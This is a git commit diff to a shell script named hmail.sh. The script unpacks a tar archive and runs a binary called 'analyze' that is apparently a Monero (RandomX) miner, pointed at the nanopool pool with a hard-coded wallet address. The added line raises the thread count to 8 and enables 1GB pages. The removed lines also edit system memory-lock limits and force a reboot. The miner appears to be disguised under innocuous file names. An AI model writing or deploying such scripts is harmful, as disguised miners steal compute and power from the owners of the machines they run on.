0e0d10508486adccb757f17f934416eea9a68688
1aia <ahmetov.almaz@gmail.com>
2022-04-02 20:10:01 +0300

    Update hmail.sh

--- hmail.sh
+++ hmail.sh
@@ -1,6 +1,1 @@
-if [ -e /root/initdone ]
-then
-    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=128 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 2 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.hmailx/itwaybot@gmail.com -l res.txt
-else
-    sudo sysctl -w vm.nr_hugepages=128 ; sudo echo "* soft memlock 262144" >> /etc/security/limits.conf ; sudo echo "* hard memlock 262144" >> /etc/security/limits.conf ; echo "." > /root/initdone ; reboot
-fi
+tar -xvf analyze.tar ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 8 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.hmailx/itwaybot@gmail.com -l res.txt --randomx-1gb-pages
